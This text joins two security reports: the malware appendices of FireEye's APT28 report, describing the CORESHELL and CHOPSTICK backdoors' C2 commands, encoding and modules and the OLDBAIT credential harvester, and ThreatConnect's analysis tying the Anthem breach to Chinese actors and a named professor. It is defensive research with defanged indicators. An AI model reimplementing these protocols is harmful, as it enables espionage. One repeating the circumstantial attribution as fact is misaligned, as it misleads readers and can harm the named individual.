 01           “rhdn”                   Unknown - Potentially a campaign identifier.Values seen so far: “rhze”, “rhdn” and “mtfs”.05           “zxdfmF6f5ah4xg”         Hostname of compromised system

 13           “0403”                   Unknown - Potentially a version number.This number is hardcoded within the implant.17           “05”                     OS Major version

 19           “01”                     OS Minor version
 1B           0x0000001a               Header length minus the command byte (LE DWORD)
 1F           0x00000023               Length of the entire message (LE DWORD)




32 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Commands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST
                             requests.The command is identified by the NULL terminated UNICODE string “OK” (O\x00\K\x00\x00\
                             x00).The command is Base64 encoded and immediately follows the “OK” string.The
                             first byte of the command message specifies the command type and is immediately followed by the PE or
                             shellcode to be executed.In this example the command byte is 04 indicating the following bytes are
                             shellcode.If the command byte was 01, 02, or 03 the following bytes would be a DLL or EXE that would
                             be written to disk and executed.Table 8: CORESHELL commands



 Command ID           Description

 01                   Save command data as %LOCALAPPDATA%\svchost.exe and execute using CreateProcess.02                   Save command data as %LOCALAPPDATA%\conhost.dll and execute using “rundll32.exe \”%s\”,#1”.03                   Save command data as %LOCALAPPDATA%\conhost.dll and execute using LoadLibrary.04                   Command data is a shell code and is executed using CreateThread.34 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?APPENDIX D:
CHOPSTICK




                              CHOPSTICK is a backdoor that uses a modularized, object-oriented framework written in C++.This
                              framework allows for a diverse set of capabilities across malware variants sharing a common code base.CHOPSTICK may communicate with external servers using SMTP or HTTP.This appendix documents
                              variants using HTTP communications.The first time CHOPSTICK is executed, it may encrypt and store configuration data in the Registry key
                              HKU\S-1-5-19_Classes\Software\Microsoft\MediaPlayer\{E6696105-E63E-4EF1-939E-
                              15DDD83B669A}\chnnl.The user HKU\S-1-5-19 corresponds to the LOCAL_SERVICE account SID.The configuration block is encrypted using RC4 encryption.The key is a combination of a 50-byte static
                              key and a four-byte salt value randomly generated at runtime.The static key is derived from opcodes in
                              the backdoor.CHOPSTICK collects detailed information from the host including the Windows version, CPU
                              architecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows
                              Vista and above and Internet Explorer settings.It also tests for the installation of specific security
                              products (Table 9) and applications (Table 10).Web Enterprise Security
                              MBAMService                                          Malwarebytes Anti-Malware




35 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?It creates a thread that records user activity on the host, capturing desktop
                             screenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window
                             contents (text, context menus, etc.).User activity is captured once every 500 milliseconds and logged in
                             an HTML-like format.The thread writes user activity log messages to the “check_mes_v5555” mailslot in
                             plain text.CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the
                             encrypted message in an edg6EF885E2.tmp temporary file.The RC4 encryption used here also uses a 50-
                             byte static key plus four-byte random salt value.After approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2
                             servers over HTTP.After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2.tmp to the C2 server using HTTP POST requests.It does not wait for a response from the server to begin
                             uploading.Once the contents of edg6EF885E2.tmp are uploaded, CHOPSTICK deletes the file.Figure 13
                             below contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp.37 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?CHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes “+” and “/” for “-” and
                             “_”, respectively.Each HTTP request contains multiple Base64 encoded URL parameters, however only
                             one parameter contains information encoded by the malware (“ai=”) and the rest of the URL parameters
                             appear to be randomly generated per request.CHOPSTICK encrypts an 11-byte sequence in the “ai=” parameter.The purpose of this parameter
                             appears to be to uniquely identify the particular instance of the backdoor to the C2 server.The Base64
                             encoded text of this parameter begins with a number of randomly generated alphabetical characters
                             presumably intended to prevent people from Base64 decoding the whole string without some knowledge
                             of how the malware family works.The first four bytes of the message are an XOR key for the remainder of
                             the data.Once decrypted using the XOR key, an 11-byte sequence is revealed.The first seven bytes are
                             static, and are hard-coded in CHOPSTICK, while the last four bytes appear to be unique.The message body of the POST request is also Base64 encoded.This encoded string is also prefixed with
                             random characters designed to break the output of a Base64 decode operation on the entire string.The
                             first 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence
                             stored in the “ai=” parameter as described above.Decrypting these bytes yields another static seven-byte
                             sequence, followed by four unique bytes.The remainder of the message body consists of the RC4
                             encrypted data containing the HTML-formatted user activity log, edg6EF885E2.tmp.After uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using
                             HTTP GET requests.The malware contains code which allows it to load or memory-map external modules
                             that export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp,
                             IsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage,
                             and TakeMessage.38 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Modularity
                             CHOPSTICK backdoors are compiled within a modularized development framework.This means that
                             two separate CHOPSTICK backdoors may contain vastly different functionality, depending on which
                             modules were included at compile time.The modules that are included in an instance of CHOPSTICK
                             may be reported to the C2 server as part of POST messages.To decode the POST content, the first step is to remove characters from the Base64 string (the number of
                             characters to remove may vary between different communication channels).In the example from Figure
                             14, the number of characters removed is seven.Once these characters are removed the decoded (but
                             still encrypted) text looks like this:

                             00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..”..3.^@$.1.@S
                             00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/
                             00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5


                             The first two words (“72 11” and “fd 22”) are checksums that are used to validate the message.The next 4
                             bytes “f8 dc 33 9e” are a salt value that is appended to the end of an RC4 key.Once decrypted, the
                             message looks like the following:

                             00000000 72 11 fd 22 f8 dc 33 9e 56 34 4d 47 4e 78 5a 57 r..”..3.V4MGNxZW
                             00000010 6c 76 63 6d 68 6a 4f 47 39 79 5a 51 3d 3c 3c ee lvcmhjOG9yZQ=<<.00000020 01 00 00 01 00 23 01 10 23 01 11 23 01 13 23 .....#..#..#..#


                             The strings “V4MGNxZWlvcmhjOG9yZQ” and “=<<\xee” are hardcoded in the implant.The modules included in this CHOPSTICK v1 implant are:



 Table 12: Example CHOPSTICK v1 module list



 Module ID         Internal Module Name            Description

 0x0001            AgentKernel                     Kernel, probably version 1.Handles communication between modules and C2
                                                   tunnels.0x1001            modKey                          Logs keystrokes and takes screen captures.0x1101            modFS                           Facilitates file system access, such as directory browsing along with reading,
                                                   deleting and opening files.0x1301            modProcRet                      Remote command shell access.Our determination of a CHOPSTICK “v1” versus “v2” is based on the self-identification of the kernel ID
                              and associated modules.Compare the list of CHOPSTICK v1 modules in Table 12 with the list of modules
                              in an example CHOPSTICK v2 variant in Table 13:


 Table 13: Example CHOPSTICK v2 module list



 Module ID         Internal Module Name            Description

 0x0002            kernel                          Kernel, probably version 2.Handles communication between modules and C2
                                                   tunnels.0x1002                                            Logs keystrokes and takes screen captures.0x1102                                            Facilitates filesystem access, such as directory browsing along with reading,
                                                   deleting and opening files.0x1302                                            Remote command shell access.0x1602                                            Load additional DLLs.41 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?The kernel IDs 0x0001 and 0x0002 indicate different versions.The corresponding modules in each
                             backdoor also are consistently identified with 0x01 and 0x02, respectively, in the second byte.In both
                             variants the modules with keystroke log, file system access, and command shell capabilities have the
                             consistent identifiers 0x10, 0x11, and 0x13, respectively, in the first byte.This suggests that the first byte
                             in the module ID identifies the module type whereas the second byte identifies the kernel version.The kernel sends commands to each module using its module ID.The commands that each module
                             understands are likely consistent from build to build.Table 14 and Table 15 show examples of commands
                             that each module understands.APPENDIX E:
OLDBAIT




                             OLDBAIT is a credential harvester that installs itself in %ALLUSERPROFILE%\\Application Data\
                             Microsoft\MediaPlayer\updatewindws.exe.There is a missing space in the MediaPlayer directory and
                             the filename is missing the ‘o’ character.Both the internal strings and logic are obfuscated and are
                             unpacked at startup.Credentials for the following applications are collected:

                             •	     Internet Explorer
                             •	     Mozilla Firefox
                             •	     Eudora
                             •	     The Bat!(an email client made by a Moldovan company)
                             •	     Becky!(an email client made by a Japanese company)

                             Both email and HTTP can be used to send out the collected credentials.Sample HTTP traffic is
                             displayed in Figure 15.There is a setup routine that loads
                             the imports into a table and all API calls reference an index to this table.In SOURFACE and EVILTOSS the
                             table is stored in a global variable while in OLDBAIT this table is allocated at runtime and a pointer is
                             passed between functions.44 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com


© 2014 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye, Inc.
All other brands, products, or service names are or may be trademarks or service marks of
their respective owners.SP.APT28.EN-US.102014
45 fireeye.comhttp://www.threatconnect.com/news/the-anthem-...The Anthem Hack: All Roads Lead
to China

Posted February 27, 2015 by ThreatConnect Intelligence Research
Team (TCIRT)[1] �led under Threat Research[2].UPDATE: Premera Latest Healthcare Insurance Agency to be
Breached[3]

When news of the Anthem breach was reported on February 4th,
2015, the security industry quite understandably went wild.A
breach of this magnitude was certainly unprecedented.Naturally,
many industry professionals were keenly interested in digging
into this incident to see what could be uncovered, and the
research team at ThreatConnect was no exception.Thanks to our
powerful API[4] and third-party partner[5] integrations, we were
able to use ThreatConnect to quickly uncover a wealth of
intelligence even when initially hindered by a relative lack of
investigative lead information and context, a key requirement of
any Threat Intelligence Platform[6] (TIP).However, before we
delve into what we were able to uncover, let’s brie�y review the
facts as they stood in the wake of the initial discovery
announcement.1 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

What We Know:

On the morning of February 4th, 2015, several major news outlets
broke the story[7] that Anthem, Inc.’s network defenses had been
breached.According to a statement from Anthem’s CEO[8], the
company fell victim to a “very sophisticated external cyber
attack,” and the hackers “obtained” the personally identi�able
information (PII) of approximately 80M customers.This included
social security numbers, birthdays, street addresses, phone
numbers and income data – plenty of information to enable
identity theft.This was a signi�cant event for several reasons:

Anthem, formerly known as Wellpoint, is the largest managed
healthcare company in the Blue Cross Blue Shield Association,
and by extension, one of the largest healthcare organizations
in the United States.As such, any compromise, no matter how
insigni�cant, would likely impact countless individuals.Blue Cross Blue Shield provides healthcare coverage for about
half the U.S. federal workforce.This means that their
information was potentially compromised too.Unlike the Sony hack which was destructive in nature and
meant to send a message for coercive purposes, the Anthem
compromise was purportedly very covert, a fact which may
suggest something about the adversary’s motives.As of late February 2015, there have not been any indications
that the ex�ltrated PII data was immediately commoditized on
the black market for the purpose of enabling identity theft, as
was the case in the Home Depot Breach.2 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...Filling the Gaps:

Obviously, these high-level observations do not provide
cybersecurity researchers a great deal of information to work with.However, when presented within the context of a Threat
Intelligence Platform (TIP), an incomplete trail of evidence can
highlight intelligence gaps, a study of which can orient threat
researchers towards their analytic objectives.To this end, let’s
examine what we wanted to discover in the context of the Anthem
breach:

Who was responsible for the attack?What was the objective of the attack?Was it cyber theft, an
espionage operation, or something different?Who was targeted in the attack?The answer to this question,
obscured as it may be, would likely shed some light on the
objective of the breach.What was the timeline of the activity?The real power of a Threat Intelligence Platform is demonstrated
when you are able to collect and maintain a robust dataset of
threat indicators, both past and present, which can help orient
you in the right direction in the wake of a newly discovered
breach.Even when you do not have a good deal of information to
start with (for example a �le hash, or an IP address), you may �nd
leads by pivoting through archived datasets until you uncover key
pieces of the puzzle.In the case of the Anthem breach, we were
able to do just that.3 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

Anthem Themed Infrastructure & Signed
Malware:

In September 2014, the ThreatConnect Intelligence Research
Team (TCIRT)[9] observed a variant of the Derusbi APT malware
family, MD5: 0A9545F9FC7A6D8596CF07A59F400FD3[10], which
was signed by a valid digital signature from the Korean company
DTOPTOOLZ Co. Derusbi is a family of malware used by multiple
actor groups but associated exclusively with Chinese APT.TCIRT
began tracking the DTOPTOOLZ signature for additional signed
malware samples and memorialized them within our Threat
Intelligence Platform over time.Analyst Comment: The DTOPTOOLZ signature has also been
observed in association with Korean Adware that is af�liated with the
actual DTOPTOOLZ Co.This adware should not be confused with the
APT malware that is abusing the same digital signature.Later, in mid-November we discovered another implant that was
digitally signed with the DTOPTOOLZ signature.This implant,
MD5: 98721c78dfbf8a45d152a888c804427c[11], was from the
“Sakula” (aka.Sakurel) family of malware, a known variant of the
Derusbi backdoor, and was con�gured to communicate with the
malicious command and control (C2) domains
extcitrix.we11point[.]com and www.we11point[.]com.Through our
Farsight  Security passive DNS[12] integration, we uncovered that
this malicious infrastructure was likely named in such a way to
impersonate the legitimate Wellpoint IT infrastructure.4 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...Passive DNS and historic DomainTools Whois data also provided
insights that helped establish an initial timeline dating back to
April 2014, when the faux domains came into existence and were
later operationalized by the attackers.A Threat Intelligence
Platform should allow for analysts to easily put together and
organize such insights, collaborate around relevant analysis
internally, and share the �nished analysis with external industry
groups and organizations.In the hopes that our community
members could bene�t from or provide further insight into this
suspicious incident, we immediately shared our threat intelligence
including indicators, signatures and analytical context to the
ThreatConnect Medical and Health Community[13] on November
13, 2014.This included sending out a noti�cation to all
stakeholders as well as our followers on Twitter[14].When the Anthem breach later came to light in early February, we
re-shared the signatures, indicators and context freely to the
entire ThreatConnect user base.As we dug further, we expanded
our understanding of the malicious we11point[.]com
infrastructure, taking particular interest to the subdomains such
as “extcitrix.we11point[.]com and “hrsolutions.we11point[.]com”.Note the “citrix”  and “hr” (human resources) pre�xes that the
adversary used to mirror legitimate remote infrastructure and
employee bene�ts resources in the May 2014 timeframe.This
provided initial insights as to the likely targeting themes and or
vectors in which the adversary may have used when initiating
their targeting campaign.5 of 33

03/22/2015 10:14 PM

[15]

http://www.threatconnect.com/news/the-anthem-...

[16]

The fact that the malicious infrastructure closely mirrored other
legitimate Wellpoint infrastructure supported our hypothesis that
the Derusbi / Sakula malware was con�gured to operate and
persist within a speci�c target enterprise.Possible Premera Blue Cross Infrastructure:

Retrospective analysis of other targeted malware samples using
the DTOPTOOLZ Co. digital signature led to the identi�cation of
an “HttpBrowser” / “HttpDump” implant MD5:
02FAB24461956458D70AEED1A028EB9C[17]
(OpenOf�cePlugin.exe), which was �rst observed on December 11,
2013.Although this malware sample is not Derusbi / Sakula, it too
is strongly believed to be associated with Chinese APT activity and
in fact may have also been involved in a Blue Cross Blue Shield

6 of 33

03/22/2015 10:14 PM

targeting campaign as early as December 2013.

http://www.threatconnect.com/news/the-anthem-...

[18]
This particular binary is con�gured to connect to the static IP
address 142.91.76[.]134.Passive DNS of this IP indicates that on
December 11th, 2013, the same date as the malware sample was
observed, the domain prennera[.]com also resolved to
142.91.76[.]134.It is believed that the prennera[.]com domain may
have been impersonating the Healthcare provider Premera Blue
Cross[19], where the attackers used the same character
replacement technique by replacing the “m” with two “n”
characters within the faux domain, the same technique that would

7 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

be seen �ve months later with the we11point[.]com command and
control infrastructure.Section Summary:

The Derusbi / Sakula malware implant types are unique in that
they have traditionally been seen within Chinese APT
espionage campaigns.The “HttpBrowser” / “HttpDump” malware implant (while a
different family of malware than Derusbi / Sakula) is also
believed to be of Chinese origin, and was also digitally signed
with the DTOPTOOLZ digitalsignature.This implant
connected to a C2 node that overlapped with prennera[.]com.We believe that the prennera[.]com domain may be
impersonating Premera Blue Cross (premera.com), using a
similar character replacement technique seen in the
we11point[.]com campaign.VAE Inc. Themed Infrastructure & Signed
Malware

Another powerful attribute of ThreatConnect is the ability for
analysts to logically group items such as atomic indicators, related
documents or signatures, all of which may include individualized
custom context enrichments and associations.Over time, the
ability to memorialize groupings of related or like activity allows
analysts to quickly uncover non-obvious relationships within their
private datasets.This is exactly what happened as we continued to

8 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

investigate these incidents.As industry analysts and media speculated Chinese APT
involvement[20] in the Anthem breach, our focus into the Derusbi
/ Sakula malware signed with the DTOPTOOLZ Co. digital
signature shifted from the we11point[.]com incident to another
cluster of activity that occurred later in May 2014.We immediately
reviewed Incident 20140526B: vaeit APT[21], an incident that we
initially shared to our Subscriber Community on September 29,
2014 after conducting retrospective analysis.[22]

[23]

Just as was the case with the we11point[.]com and prennera[.]com

9 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

incidents, the VAE, Inc. incident is also believed to be associated
with Chinese APT espionage activity.The targeted incident relied upon the Sakula executable MD5:
230D8A7A60A07DF28A291B13DDF3351F[25] which had a XOR
0x9A encoded C2 callbacks to the IP address 192.199.254[.]126
(registered to Wehostwebsites[.]com – “Tom Yu” of Baoan,
Shenzhen City, Guangdong Province, China) as well as a
hardcoded callback to sharepoint-vaeit[.]com.Passive DNS of the
static C2 IP 192.199.254[.]126 revealed a single suspicious domain
of interest – topsec2014[.]com.This domain had historic
resolution around May 8, 2014 within a month of the �rst
observed Sakula activity using the IP 192.199.254[.]126 as C2.[26]

10 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

[27]

Using historic Whois, we discovered that topsec2014[.]com
was initially registered by li2384826402@yahoo[.]com on May 6th,
2014.Although the li2384826402@yahoo[.]com registrant is likely
a reseller given that it has been observed registering several
thousands of other domains, the fact that it was used to register
both the faux VAE, Inc. C2 infrastructure and the overlapping
domain topsec2014[.]com within the same month suggests that
there may be a relationship between the client of the reseller for
the VAE, Inc. infrastructure and the client for topsec2014[.]com.[28]

11 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

[29]

Just four minutes after the initial registration of topsec2014[.]com,
the Whois records were updated from the initial registrant, Li
Ning – li2384826402@yahoo[.]com to TopSec China –
TopSec_2014@163[.]com.This domain record has been
unchanged since May 7th 2014.The we11point[.]com
infrastructure and by extension the faux VAE Inc. infrastructure is
associated with Cluster 2 of the ScanBox framework[30] by PwC.The latest PwC update to ScanBox states that there are “links
between the domain allegedly used in the Anthem hack
(we11point.com) to Cluster 2 through shared WHOIS details.”

OPM Themed Infrastructure

One notable pattern was how the domain Whois registration
information for the VAE, Inc. themed infrastructure was quickly
updated and obfuscated with pseudorandom 10 character
gmx.com email addresses and using the names of various comic
book characters from the Iron Man franchise.This comic-themed
naming convention has been previously documented by our
friends at Crowdstrike[31] in what they characterize as being
associated with a Chinese APT group they have dubbed “Deep
Panda”.Leveraging our DomainTools partnership, we were able to

12 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

correlate the outlier domain opm-learning[.]org.This domain was
also purportedly registered by the Iron Man movie hero “Tony
Stark” on July 28, 2014.This infrastructure naming convention
suggests a possible Of�ce of Personnel Management (OPM)
theme.However, in this case we lacked any speci�c sample of
malware to verify our initial suspicions that this infrastructure
was operational.The possible OPM reference in the domain name
is noteworthy considering it was revealed in July of 2014 that OPM
had been compromised[32] by a likely state-sponsored Chinese
actor in mid-March of that year.The fact this domain was
registered after the breach occurred suggests that OPM could be
an ongoing direct target of Chinese state-sponsored cyber
espionage activity.Our attention then turned to the FBI Flash Report A-000049-
MW[33] that was publicly reported by Brian Krebs [34]on February
6th, 2015.This FBI Flash Report was issued on January 27th, 2015,
the same day an Anthem administrator detected suspicious
activity according to an internal memo[35].This memo goes on to
indicate that the FBI would not be party to the Anthem breach
until they were noti�ed on January 29th, 2015; based on these
facts we assess with high con�dence that it is very unlikely that
the FBI Flash Report was directly related to the Anthem breach.The malicious infrastructure highlighted in the report are
the domains images.googlewebcache[.]com and
smtp.outlookssl[.]com.Both of these top level domains were
included with other related domains, all of which were shared on
September 16th, 2013 to the ThreatConnect Subscriber
Community in Incident 20130823C: Some.Trouble APT
Domains[37], roughly a year and half prior to the FBI Flash report.It is important to mention that both the domains
images.googlewebcache[.]com and smtp.outlookssl[.]comas were
also previously identi�ed in an October 2014 PwC blog post[38] as
seen within Cluster 1 of the Scanbox framework, while the Sakula
activity with we11point and VAEIT is contained within Cluster 2 of
that report.This implies that the actor referenced within the FBI
Flash report uses shared capabilities (in this case the ScanBox kit)
with the Sakula / we11point actor.Section Summary:

The Derusbi / Sakula malware seen in both the
we11point[.]com and VAE Inc. campaigns were structurally the
same and digitally signed with the DTOPTOOLZ signature.14 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...The emerging theme is that this particular signature and
family of malware is highly indicative of a particular Chinese
APT activity.Within this web of malicious infrastructure, there is an
interesting overlap with the topsec2014[.]com domain and
attack infrastructure.TCIRT identi�ed a domain opm-learning[.]org that had a
similar superhero themed WHOIS registrant to the Sakula /
VAE Inc. infrastructure.The possible OPM reference is
noteworthy considering the Of�ce of Personnel Management
(OPM) was compromised in March 2014.Additionally, an FBI
Flash Report 0000-49MW referenced indicators that were
possibly associated with the USIS hack and a Derusbi variant
called “Kakfum” / “InfoAdmin”.Both the FBI Flash
infrastructure and the Sakula / VAE Inc. infrastructure are tied
to the capability usage of the ScanBox framework, residing in
Clusters 1 and 2 respectively.Unveiling Song Yubo and Southeast University:

The Professor

We conducted open source research in pursuit of further
information on the TopSec_2014@163[.]com email registrant.A
keyword search returned several results for
“topsec2014@163[.]com” in association with a number of
academic institutions in Nanjing, China.Although the email

15 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

address wasn’t an exact match to the topsec2014[.]com domain
registrant (notice the absence of the underscore), such a similarity
warranted further investigation.[39]

[40]

16 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

We examined the links for any relevant intelligence, and
discovered that nearly all of the search results led to pages that
contained an announcement for an information security
competition sponsored by the Southeast University-Topsec
Information Security and Mobile Internet Technology Joint
Research Center.This entity appears to be a joint research
venture between the University and Chinese networking giant
Beijing Topsec Network Security Technology Co., a.k.a.Beijing
Topsec.[41]

17 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

[42]

The announcements list a Professor “Song Yubo” as the point of
contact for the event, and directs interested parties to his email
address, topsec2014@163[.]com, for further questions.[43]

[44]

According to his LinkedIn page, Song is a Teacher at the Southeast
University, speci�cally interested in the �eld of
telecommunications.Additionally, he is an avid researcher, and
has published numerous academic papers on computer network
exploitation on various e-journal publication sites, such as Google
Scholar[45].Further, he lists skills such as “cryptography,”
“penetration testing” and “computer network security,” etc.on his
Research Gate pro�le[46].18 of 33

03/22/2015 10:14 PM

[47]

http://www.threatconnect.com/news/the-anthem-...

[48]

As we continued to develop a pro�le on Professor Song, we began
to have the sense that his interest in information security research
strongly overlapped with that of someone who might be interested
in or at least capable of conducting sophisticated cyber attacks.However, interests alone are not enough to warrant reasonable
suspicion, so we had to do more digging.Additionally, the soft link between TopSec_2014@163[.]com and
topsec2014@163[.]com alone was not suf�cient to make

19 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

associations with any reasonable con�dence, but as it turns out,
Yubo has in fact been previously named as a person of interest in
the context of offensive Chinese cyber activity.The University

In March 2012, Northrop Grumman presented a commissioned
report to Congress[49] detailing Chinese cyber warfare capabilities.The report asserts with high con�dence that both Song and the
Information Security Research Center at Southeast University
have received numerous state-sponsored research grants, and by
extension, cooperated with the Government of China in
conducting information security research and development
(R&D).Song himself has also conducted his fair share of state-
sponsored research, notably under the National Ministry of State
Security 115 Program – a highly sensitive research grant to fund
ambiguous information warfare R&D, almost certainly in support
of PLA programs.The Competition

As we can see, the evidence continued to stack up.The real
smoking gun, however, was when we began to notice a strong
temporal overlap with the various stages of the TOPSEC Cup that
Song and Beijing Topsec were organizing, and the registration
dates of malicious infrastructure as well as the malware
compilation dates.[52]

21 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

[53]

Based upon the translated registration form that we obtained from
Song Yubo’s personal Baidu document sharing account, open
registration for the “TOPSEC Cup” began on May 4th, 2014 and
would close on May 14th, 2014.The details of the competition that were shared on the
announcement are extremely ambiguous, and probably for good
reason.The introductory paragraph mentions that the primary
goal of the event is to facilitate the training and discovery of new
talent, noting that exceptional participants would receive priority
consideration for internships and jobs with Beijing Topsec.The event itself was broken down into several distinct rounds of
competition.Firstly, the preliminary round required that all
eligible registrants would attempt to remotely access and navigate
through the network.Should a participating team perform
exceptionally in the preliminary qualifying round, they would be
invited to participate in the �nal round on-site in Nanjing.22 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...In this �nal round, participants would be required to build their
own “information systems and network environments.”  The
announcement notes that the students must rely upon their own
laptop and software tools to accomplish this task.Further, the
announcement notes that participants are prohibited from
attacking the provided server as well as their competitors.Section Summary:

Song Yubo and his research center at Southeast University
appear to be central players in this narrative, as highlighted by
their �nancial connections to the government of China, in
particular the Ministry of State Security (MSS), China’s premier
human intelligence agency.If the MSS was involved, we can deduce that the Anthem hack
could have been for the purposes of gathering sensitive
information for follow-on HUMINT targeting via
blackmail, asset recruitment or technical targeting operations
against individuals at home.Song’s use of the topsec email alias suggests a greater
association w/ TOPSEC.It seems as if the competition is almost certainly the cause for
the topsec2014[.]com domain.What is very curious, however,
is the initial registration by the reseller
li2384826402@yahoo[.]com, which is a tactic seen within the
con�rmed malicious faux VAE Inc.infrastructure.The overlap between the competition website and the static
command and control infrastructure seen in the Derusbi /

23 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

Sakula implant is was likely an error made by the attackers.Tianrongxin, a.k.a.Beijing Topsec Technology
Co:

The Company

To enhance our open-source capabilities, we partnered up with Dr.
James Mulvenon[54] and his team of China experts at Defense
Group, Inc. (DGI)[55].We shared with them everything that we
knew at the time, walking through the technical details which led
us all the way to Song Yubo and the competition announcement.From there, they were able to uncover a wealth of very
consequential background information on Beijing Topsec
Technology Co (Beijing Topsec), the sponsoring organization for
Song Yubo’s information security competition.DGI’s research indicated that Beijing Topsec is one of the largest
information security hardware providers in China.In 1996, they
were the �rst Chinese company to break into the market with the
release of China’s �rst indigenously-manufactured �rewall.Since
then, they have expanded their business to include a consulting
practice focused on issues such as vulnerability mining, software
code analysis, threat intelligence, and encryption R&D, amongst
other things.The company served as a core technical support unit for network

24 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

security at the 2008 Olympic Games – an event which was tightly
controlled by the state.Additionally, Beijing Topsec is a known
partner of the Chinese military.Since 2009, the company has
possessed information publication credentials for military
network procurement.Since 2013, they have been publicly
recognized as the Chinese equivalent of a cleared defense
contractor.The links between Beijing Topsec and the Chinese government are
fairly substantial, highlighted by long-standing partnerships
between even the most shadowy elements of the Chinese military.The Leaked Cable

A very compelling piece of evidence is found in the contents of a
leaked 2009 diplomatic security cable from the Department of
State, published by The Guardian.[56]  The cable is a daily digest of
Diplomatic Security alerts – essentially a situational awareness
primer for State Department employees to inform them of new
and existing threats.In one section, the cable highlights that the
Founder of Beijing Topsec, He Weidong, had openly talked about
receiving directives from the PLA in an interview with China News
Network.In the interview, the founder quite curiously states that
Topsec is less a commercial entity, but rather a research institute,
and that the company received about half of its start-up capital
directly from the PLA.The cable further claims that Topsec
actively recruits for the PLA cyber army.25 of 33

03/22/2015 10:14 PM

[57]

http://www.threatconnect.com/news/the-anthem-...

[58]

It would also appear that not only does Beijing Topsec have deep
ties to state-run cyber activity, but also within the independent
hacker community as well.Of note, the company hired the
notorious hacker Lin Yong, a.k.a.“Lion” (of the Honker Union of
China[59]) in the early 2000s as a security service engineer and to
conduct network training.Section Summary:

It is not surprising that the Chinese government would be
interested in partnering with a private organization such as
Beijing Topsec for use as a front for state-sponsored activity.The association between Southeast University and Beijing
Topsec as manifested in the joint information security research
center highlights the possibility of growing links between

26 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

state-sponsored activity and academic institutions,
particularly those that receive funding from the central
government.All in all, it would seem that China is pursuing a uni�ed
approach to cyber operations, relying on all unique facets of
the workforce: academia, private industry, and independent
hackers, as well as the PLA to achieve their strategic goals.Conclusion:

The Anthem breach exposes the insidious reality of modern
Chinese cyber espionage as it continues its unrelenting strikes at
the soft underbelly of the American way of life.Moreover, it
demonstrates the imposing yet increasingly common reality of
conducting threat intelligence analysis without substantial threat
intelligence to start with.Fortunately for us, we were able to
deduce informed answers to some of the outstanding questions to
this breach by scrutinizing our archival data troves that are
ef�ciently stored within our Threat Intelligence Platform and
partner integrations.In the �eld of cyber security, industry
professionals must learn to play the long game in order to
generate a proactive sense of situational awareness, allowing for
greater ef�ciency and �exibility in mitigating future threats.Additionally, this incident underscores the frustrating disparity of
the industry when it comes to naming conventions.With so many
threat actors and indicators �oating around, it is can be
frustrating to keep track of all the disparate pieces of evidence,

27 of 33

03/22/2015 10:14 PM

http://www.threatconnect.com/news/the-anthem-...

especially when countless naming conventions are applied.Without the use of a Threat Intelligence Platform to keep track of
the �ood of incoming threat data, this task would be
extraordinarily time consuming at best and crippling at worst.Moving forward, it is important to bear in mind that the adversary,
regardless of country of origin, shall almost certainly leverage our
every weakness against us.Even something as seemingly
innocuous as confusion over names can easily consume analytical
bandwidth, creating a window of opportunity to strike.We – that
is security professionals, private industry and governments alike –
must proactively harden our network defenses and hasten our
incident responses as a united, synchronous entity.We have shared details on Song Yubo[60] and af�liated indicators
within the ThreatConnect Common Community.This share also
includes the full-text DGI “BLUE HERON” research[61] which
provides greater insight into Song Yubo, Southeast University and
Beijing Topsec.All things considered, industry must learn to adopt a cooperative
defense mindset in the hopes of rebuf�ng future attacks.The most
resolute defense we have is each other, so be like the TCIRT and
start actively defending your own community from the next big
breach.Register for a free ThreatConnect account today[62] to get
